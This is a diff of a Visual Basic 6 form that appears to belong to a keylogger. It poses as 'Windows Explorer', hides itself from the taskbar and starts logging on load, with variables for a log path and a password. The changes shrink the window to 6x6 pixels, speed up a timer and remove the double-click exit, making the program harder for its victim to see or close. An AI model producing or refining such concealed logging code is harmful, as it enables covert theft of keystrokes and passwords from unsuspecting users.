@@ -2,21 +2,21 @@ VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   0  'None
    Caption         =   "Windows Explorer"
-   ClientHeight    =   4095
+   ClientHeight    =   90
    ClientLeft      =   0
    ClientTop       =   0
-   ClientWidth     =   5040
+   ClientWidth     =   90
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
-   ScaleHeight     =   273
+   ScaleHeight     =   6
    ScaleMode       =   3  'Pixel
-   ScaleWidth      =   336
+   ScaleWidth      =   6
    ShowInTaskbar   =   0   'False
    Begin VB.Timer Timer1 
       Enabled         =   0   'False
-      Interval        =   65
+      Interval        =   10
       Left            =   4560
       Top             =   720
    End
@@ -32,16 +32,16 @@ Begin VB.Form Form1
       Locked          =   -1  'True
       TabIndex        =   1
       Top             =   120
-      Width           =   4455
+      Width           =   2775
    End
    Begin VB.TextBox Text1 
       Enabled         =   0   'False
-      Height          =   3495
+      Height          =   1935
       Left            =   120
       MultiLine       =   -1  'True
       TabIndex        =   0
       Top             =   480
-      Width           =   4815
+      Width           =   3735
    End
 End
 Attribute VB_Name = "Form1"
@@ -75,9 +75,7 @@ Dim LPath, Pwd, PCDec As String
 'Prevent only Titles in LOG
 Dim HasSomeText As Boolean 'Log wil not recorded if HasSomeText=False
 
-Private Sub Form_DblClick()
-End
-End Sub
+
 
 Private Sub Form_Load()
 
@@ -93,7 +91,6 @@ Me.Top = Screen.Height - Me.Height
 App.TaskVisible = False
 
 Timer2.Enabled = True
-
 Call startLogging
 
 End Sub
